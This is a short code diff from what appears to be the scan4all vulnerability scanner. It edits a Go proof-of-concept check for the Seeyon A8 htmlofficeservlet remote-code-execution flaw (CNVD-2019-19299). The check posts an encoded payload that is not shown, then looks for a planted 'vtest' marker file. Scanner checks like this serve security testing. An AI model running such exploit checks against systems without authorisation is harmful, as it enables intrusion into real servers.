@@ -4,7 +4,6 @@ import (
 	"encoding/base64"
 	"fmt"
 	"github.com/hktalent/scan4all/pkg"
-	"strings"
 )
 
 //A8 htmlofficeservlet RCE漏洞
@@ -15,7 +14,7 @@ func CNVD_2019_19299(u string) bool {
 	if req, err := pkg.HttpRequset(u+"/seeyon/htmlofficeservlet", "POST", string(sEnc), false, nil); err == nil {
 		if req.StatusCode == 200 {
 			if req2, err := pkg.HttpRequset(u+"/seeyon/v.txt", "GET", "", false, nil); err == nil {
-				if req2.StatusCode == 200 && strings.Contains(req2.Body, "vtest") {
+				if req2.StatusCode == 200 && pkg.StrContains(req2.Body, "vtest") {
 					pkg.GoPocLog(fmt.Sprintf("Found vuln seeyon CNVD_2019_19299|%s\n", u+"/seeyon/v.txt"))
 					return true
 				}
